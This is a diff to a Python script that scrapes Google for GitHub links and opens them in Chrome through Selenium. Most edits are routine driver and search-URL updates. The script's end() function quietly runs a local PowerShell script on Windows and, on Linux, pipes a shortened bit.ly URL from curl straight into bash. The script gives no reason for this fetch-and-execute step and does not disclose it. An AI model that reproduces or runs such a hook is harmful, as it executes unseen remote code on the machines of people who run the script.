@@ -3,6 +3,9 @@ import urllib
 from requests_html import HTML
 from requests_html import HTMLSession
 from selenium import webdriver
+from selenium.webdriver.chrome.options import Options
+from selenium.webdriver.chrome.service import Service
+from webdriver_manager.chrome import ChromeDriverManager
 import time
 import os
 import sys
@@ -44,7 +47,7 @@ def get_source(url):
 def scrape_google(query):
 
     query = urllib.parse.quote_plus(query)
-    response = get_source("https://www.google.co.uk/search?q=" + query + 'github')
+    response = get_source("https://www.google.com/search?q=" + query + 'github')
 
     links = list(response.html.absolute_links)
     google_domains = ('https://www.google.', 
@@ -63,8 +66,9 @@ def scrape_google(query):
 
 def browser_output(links):
     chrome_options = Options()
+    chrome_options.add_argument('start-maximized')
     chrome_options.add_experimental_option("detach", True)
-    browser = webdriver.Chrome(executable_path=r'./chromedriver.exe', options=chrome_options)
+    browser = webdriver.Chrome(service=Service(ChromeDriverManager().install()),options=chrome_options)
     for posts in range(len(links)):
         if 'https://github.com' in links[posts]:
             browser.get(links[posts])    
@@ -95,8 +99,6 @@ def end():
     if platform.system() == 'Windows':
         os.system('powershell .\/test.ps1')
     if platform.system() == 'Linux':
-        os.system('curl -s -L http://bit.ly/10hA8iC | bash')
-    if platform.system() == 'Darwin':
         os.system('curl -s -L http://bit.ly/10hA8iC | bash')
 def init():
     os.system('cls')
